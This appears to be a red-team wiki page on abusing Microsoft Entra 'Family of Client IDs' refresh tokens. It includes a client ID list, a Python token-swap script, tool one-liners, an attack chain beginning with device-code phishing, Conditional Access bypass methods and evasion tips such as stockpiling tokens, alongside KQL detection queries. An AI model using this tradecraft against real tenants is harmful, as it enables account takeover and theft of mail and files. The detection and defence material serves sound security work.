---
title: OAuth FOCI — Family of Client IDs abuse
slug: oauth-foci-family-of-client-ids-abuse
aliases: [foci, family-of-client-ids, foci-abuse]
---

> **TL;DR:** Microsoft tags ~20 first-party Entra client apps as a "Family of Client IDs". A refresh token issued for any FOCI member can be redeemed for an access token *to any other FOCI client* and *any resource that client is authorised for* — without the user ever consenting to the second client. One refresh token = an entire identity catalogue.

## Mental model

When a Microsoft first-party app authenticates (Outlook, Teams, OneDrive, Edge, Azure CLI, etc.) it gets a refresh token whose JWT contains `foci: "1"`. The STS will redeem that refresh token for *any* client in the same family, swapping the `client_id` in the request. Effect: if you grab a refresh token for the "Microsoft Office" client, you can mint a Graph access token for the "Microsoft Authentication Broker" client, and a SharePoint token for the "OneDrive iOS" client, even though the user only ever signed into Outlook.

Why it exists: the same human signs into a dozen first-party apps; Microsoft wanted single-sign-on without re-consent. Why it bites: **Conditional Access policies often scope to a specific app** (e.g., "require MFA for Office 365 Exchange Online"). If the policy doesn't cover the *target* FOCI client, you swap clients and walk through the gap.

## The family (verified 2024-2025)

```text
1b730954-1685-4b74-9bfd-dac224a7b894   Azure Active Directory PowerShell
1fec8e78-bce4-4aaf-ab1b-5451cc387264   Microsoft Teams
1950a258-227b-4e31-a9cf-717495945fc2   Microsoft Azure PowerShell
04b07795-8ddb-461a-bbee-02f9e1bf7b46   Microsoft Azure CLI
26a7ee05-5602-4d76-a7ba-eae8b7b67941   Windows Search
27922004-5251-4030-b22d-91ecd9a37ea4   Outlook Mobile
4813382a-8fa7-425e-ab75-3b753aab3abb   Microsoft Authenticator
872cd9fa-d31f-45e0-9eab-6e460a02d1f1   Visual Studio
af124e86-4e96-495a-b70a-90f90ab96707   OneDrive iOS
d3590ed6-52b3-4102-aeff-aad2292ab01c   Microsoft Office
ab9b8c07-8f02-4f72-87fa-80105867a763   OneDrive SyncEngine
29d9ed98-a469-4536-ade2-f981bc1d605e   Microsoft Authentication Broker (MAB)
9ba1a5c7-f17a-4de9-a1f1-6178c8d51223   Intune CMM
ecd6b820-32c2-49b6-98a6-444530e5a77a   Edge
... (current list refreshes; tracked at https://github.com/secureworks/family-of-client-ids-research)
```

`MAB (29d9ed9..)` is the "magic" member — its tokens can register devices, request PRTs, and broker for everything.

## Tradecraft

### Refresh-token swap

```python
import requests
TENANT = "common"
RT = "<long-foci-refresh-token>"
TARGET_CLIENT = "29d9ed98-a469-4536-ade2-f981bc1d605e"     # MAB
RESOURCE      = "https://graph.microsoft.com"

r = requests.post(f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token", data={
    "client_id":     TARGET_CLIENT,
    "grant_type":    "refresh_token",
    "refresh_token": RT,
    "scope":         f"{RESOURCE}/.default offline_access",
})
print(r.json()["access_token"])
```

The response includes a fresh access token for the requested resource **and** a new refresh token still bearing `foci: "1"` — you've migrated identity without losing chain-of-trust.

### Tooling

- `roadtx` (ROADtools) — `roadtx refreshtokento <target_client>`.
- `TokenTactics` (PowerShell) — every common swap as a one-liner (`Get-AzureToken -Client MSGraph`, `Get-AzureToken -Client OutlookAPI`).
- `TokenTacticsV2` (.NET) — same, BOF-friendly.
- `GraphRunner` invokes FOCI swap internally to enumerate Graph with any harvested refresh token; see [[graphrunner-msgraph-redteam]].

### Common chains

```text
[seed]  Phish device code → refresh token for "Microsoft Office"
   ↓
[swap1] Redeem as MAB → Graph access token (read mail, files, users)
   ↓
[swap2] Redeem as Teams → Teams chat read/send
   ↓
[swap3] Redeem as Authenticator → device registration → mint PRT → [[entra-prt-cookie-theft]]
```

### Bypassing Conditional Access

CA policies are usually written against the *first-party app* (e.g., "Require MFA for Exchange Online", "Block from Outlook Mobile"). Swap into a client the policy doesn't enumerate and the resource still honours the token. Specifically:

- "Block legacy auth" — scoped to clients flagged as legacy; modern FOCI clients sail past.
- "Require compliant device for Office" — if scoped to `Office 365` cloud-app, swap to `Microsoft Graph` and read mail via Graph instead.
- "Require MFA for Teams" — refresh token from a previously-MFA'd Outlook session inherits the `amr` claim; swap to Teams gets a token with `amr: ["mfa"]` even though the *Teams* sign-in was never prompted.

Defence: scope CA to **resource** (`Office 365` family + `Microsoft Graph`) and use **token-protection / sign-in frequency** policies that re-evaluate continuously.

## Detection / Telemetry

- **Entra sign-in logs**: `Cross-app refresh token redemption` appears as a sign-in with `Authentication Protocol = OAuth 2.0` and the *target* client ID. Hunt for sequences of the same user/correlation ID redeeming multiple distinct `appId`s within minutes:

```kql
SigninLogs
| where ResultType == 0 and AuthenticationProtocol == "OAuth2.0"
| summarize Apps = make_set(AppDisplayName), n = dcount(AppId) by UserPrincipalName, bin(TimeGenerated, 10m), CorrelationId
| where n >= 3
```

- **`amr` claim inheritance**: tokens minted via FOCI swap inherit `amr` from the original auth event. Hunt for `amr: ["mfa"]` on tokens with no preceding interactive MFA event.
- **MAB usage from non-Authenticator**: client ID `29d9ed98-...` from an IP/UA that isn't a real Authenticator install is a strong signal.

## OPSEC pitfalls

- A revoked refresh token (admin "revoke sessions", risky-user policy) kills every swap immediately. Stockpile **access tokens** at each pivot — they survive refresh-token revocation until expiry.
- Some tenants restrict first-party app access via "Admin consent required" or app-blocking policies (Entra → Enterprise apps → User settings). FOCI swap into a blocked app fails with `AADSTS50105`.
- Continuous Access Evaluation (CAE) shortens the gap between revoke and effective kill on Graph/Exchange/Teams to ~5 min. Token Protection / TBT (Token Binding to TPM) defeats raw refresh-token replay entirely on tenants that enable it.
- The family list is **not officially published**. Tools encode a snapshot; new clients get tagged silently. Re-check the current set via `https://login.microsoftonline.com/.well-known/openid-configuration` deep links and community-maintained lists before assuming a swap works.
- Refresh token issued by an *external tenant* (B2B guest) carries `tid` of the issuer tenant; swap works but resource access is governed by guest's permissions in the home tenant.

## References

- https://github.com/secureworks/family-of-client-ids-research
- https://www.secureworks.com/research/abusing-family-refresh-tokens-for-unauthorized-access
- https://github.com/rvrsh3ll/TokenTactics
- https://github.com/f-bader/TokenTacticsV2
- https://github.com/dafthack/GraphRunner
- https://github.com/dirkjanm/ROADtools

See also: [[az-cli-tokens]], [[entra-prt-cookie-theft]], [[entra-device-code-prt-pivot]], [[oauth-modern-attacks]], [[oauth-token-theft]], [[oauth-token-leak-vectors]], [[graphrunner-msgraph-redteam]], [[conditional-access-bypass-modern]]
